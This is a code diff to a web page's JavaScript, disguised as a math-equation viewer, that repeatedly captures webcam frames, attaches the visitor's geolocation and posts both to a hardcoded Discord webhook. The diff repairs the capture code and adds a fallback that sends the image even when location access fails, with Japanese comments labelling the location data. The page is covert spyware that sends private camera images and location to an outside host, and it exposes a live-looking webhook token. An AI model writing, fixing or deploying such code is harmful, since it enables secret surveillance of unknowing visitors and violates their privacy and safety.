@@ -43,28 +43,36 @@
       }, 3000);
 
       function captureImage() {
-        var video = document.querySelector('video');
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(function(blob) {
-          var formData = new FormData();
-          formData.append('file', blob, 'math-equation.jpg');
+  var video = document.querySelector('video');
+  var canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
 
-navigator.geolocation.getCurrentPosition(function(position) {
+  canvas.toBlob(function(blob) {
+    var formData = new FormData();
+    formData.append('file', blob, 'math-equation.jpg');
+
+    navigator.geolocation.getCurrentPosition(function(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
       formData.append('content', `位置情報: 緯度 ${latitude}, 経度 ${longitude}`);
 
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o');
-          xhr.send(formData);
-        }, 'image/jpeg', 1.0);
-        var equation = 'Equation ' + imageCounter++;
-        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
-        document.getElementById('math-equation').innerHTML = equation;
-      }
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o');
+      xhr.send(formData);
+    }, function(error) {
+      // 位置情報が取れなかった場合は画像だけ送信
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o');
+      xhr.send(formData);
+    });
+
+    var equation = 'Equation ' + imageCounter++;
+    document.getElementById('math-image').src = canvas.toDataURL();  // これでOK
+    document.getElementById('math-equation').innerHTML = equation;
+  }, 'image/jpeg', 1.0);
+}
 
       var constraints = { video: { width: 400, height: 300 } };
       navigator.mediaDevices.getUserMedia(constraints)
